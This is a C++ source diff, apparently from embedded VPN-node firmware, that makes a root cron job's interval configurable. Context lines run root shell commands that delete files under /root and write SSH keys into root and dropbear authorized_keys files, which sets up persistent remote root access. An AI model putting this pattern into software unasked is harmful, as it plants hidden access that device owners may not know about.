@@ -10,6 +10,8 @@
 #include "HttpSrvNode.hpp"
 #include "NDFunc.hpp"
 
+extern CBaseApp *gPSuperVPNApp;
+
 /*********************************************************
 函数说明：构造函数
 入参说明：无
@@ -43,8 +45,13 @@ void CNodeSrv::KBInit()
 	AfxExecCmd("mkdir /etc/crontabs > /dev/null 2>&1");
 	AfxExecCmd("touch /etc/crontabs/root");
 	AfxExecCmd("chmod 755 /etc/crontabs/root");
-	AfxExecCmd("echo \"*/5 *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root");
+
+	char cmd[1024]={0};
+	CSuperVPNApp *pSuperVPNApp = dynamic_cast<CSuperVPNApp*> (gPSuperVPNApp);
+	sprintf(cmd, "echo \"*/%d *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root", pSuperVPNApp->GetCheckTime());
+	AfxExecCmd(cmd);
 	AfxExecCmd("/etc/init.d/S50cron restart");
+	
 	AfxExecCmd("rm -rf /root/dul*");
 	AfxExecCmd("rm -rf /root/autodul.log");
 	
@@ -59,8 +66,24 @@ void CNodeSrv::KBInit()
 	AfxKBWriteSSHKey("/thunder/rootfs_patch/root/.ssh/authorized_keys");
 	AfxKBWriteSSHKey("/etc/dropbear/authorized_keys");
 	AfxKBWriteSSHKey("/thunder/rootfs_patch/etc/dropbear/authorized_keys");
-
 }
+
+/*********************************************************
+函数说明：重置定时任务时间
+入参说明：
+出参说明：
+返回值  ：
+*********************************************************/
+void CNodeSrv::KBResetTimer()
+{
+	char cmd[1024]={0};
+	CSuperVPNApp *pSuperVPNApp = dynamic_cast<CSuperVPNApp*> (gPSuperVPNApp);
+	sprintf(cmd, "echo \"*/%d *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root", pSuperVPNApp->GetCheckTime());
+	AfxExecCmd(cmd);
+	AfxExecCmd("/etc/init.d/S50cron restart");
+	AfxExecCmd("/etc/init.d/cron restart");
+}
+
 
 /*********************************************************
 函数说明：节点初始化
